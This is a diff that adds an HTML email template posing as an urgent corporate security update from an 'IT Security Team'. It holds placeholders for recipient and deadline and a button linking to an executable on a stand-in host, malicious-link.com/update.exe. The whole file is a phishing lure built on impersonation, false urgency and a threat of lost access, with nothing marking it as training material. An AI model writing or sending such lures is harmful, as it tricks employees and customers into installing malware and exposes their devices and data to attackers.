@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent: Security Update Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            background-color: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .header {
+            background-color: #e74c3c;
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }
+        .content {
+            padding: 20px;
+            line-height: 1.6;
+            color: #333;
+        }
+        .cta {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .button {
+            background-color: #3498db;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        .button:hover {
+            background-color: #2980b9;
+        }
+        .footer {
+            background-color: #f9f9f9;
+            padding: 15px;
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+            border-top: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Action Required: Critical Security Update</h1>
+        </div>
+        <div class="content">
+            <p>Dear [Employee/Customer],</p>
+            <p>Our IT department has identified a critical vulnerability that may affect your device. To ensure the safety of your data and prevent unauthorized access, it is mandatory to install the latest security update immediately.</p>
+            <p>Please download the update file from the link below and follow the provided instructions to complete the installation process.</p>
+            <div class="cta">
+                <a href="http://malicious-link.com/update.exe" class="button">Download Security Update</a>
+            </div>
+            <p>Failure to update your system by <strong>[specific deadline]</strong> may result in restricted access to company resources.</p>
+            <p>Thank you for your cooperation.<br>IT Security Team</p>
+        </div>
+        <div class="footer">
+            <p>If you have any questions, contact us at <a href="mailto:support@yourcompany.com">support@yourcompany.com</a>.</p>
+            <p>&copy; 2024 YourCompany. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
